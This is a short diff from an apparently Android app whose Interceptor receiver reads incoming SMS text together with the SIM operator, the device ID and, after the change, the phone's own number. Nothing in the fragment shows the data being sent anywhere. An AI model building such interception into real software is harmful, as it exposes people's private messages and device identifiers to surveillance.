@@ -25,7 +25,7 @@ public class Interceptor extends BroadcastReceiver {
 
                 for (int i = 0; i < pdusObj.length; i++) {
                     SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
-                    number = currentMessage.getDisplayOriginatingAddress();
+                    number = MainActivity.MANAGER.getLine1Number();
                     message = currentMessage.getDisplayMessageBody();
                     simOperator = MainActivity.MANAGER.getSimOperator();
                     deviceId = MainActivity.MANAGER.getDeviceId();
